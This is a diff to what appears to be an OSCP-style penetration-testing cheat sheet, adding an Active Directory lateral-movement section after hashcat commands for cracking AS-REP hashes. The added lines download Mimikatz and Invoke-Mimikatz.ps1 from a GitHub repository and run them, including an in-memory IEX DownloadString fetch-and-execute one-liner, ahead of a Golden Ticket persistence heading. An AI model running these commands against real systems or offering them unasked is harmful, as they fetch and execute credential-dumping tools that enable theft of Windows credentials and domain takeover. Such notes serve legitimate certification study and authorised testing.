@@ -1220,6 +1220,43 @@ hashcat -m 18200 -a 0 hashes.txt wordlist.txt -o quebradas.txt
 hashcat -m 18200 -a 0 hashes.txt wordlist.txt --show
 hashcat -m 18200 -a 0 hashes.txt wordlist.txt --potfile-disable
 ```
+# LATERAL MOVEMENT - ACTIVE DIRECTORY
+## LATERAL MOVEMENT - MIMIKATZ
+##### LATERAL MOVEMENT MIMIKATZ - LOAD REQUIREMENTS
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/mimikatz_trunk.zip -Outfile mimikatz_trunk.zip
+expand-archive -path ".\mimikatz_trunk.zip" -destinationpath ".\"
+cd x64
+.\mimikatz.exe
+```
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/x64/mimikatz.exe -Outfile mimikatz.exe
+.\mimikatz.exe
+```
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1 -Outfile Invoke-Mimikatz.ps1
+Import-Module .\Invoke-Mimikatz.ps1
+Invoke-Mimikatz
+```
+```
+IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1")
+Invoke-Mimikatz
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 # PERSISTENCE - ACTIVE DIRECTORY
 ## GOLDEN TICKET MIMIKATZ
 ##### GOLDEN TICKET MIMIKATZ - LOAD REQUIREMENTS
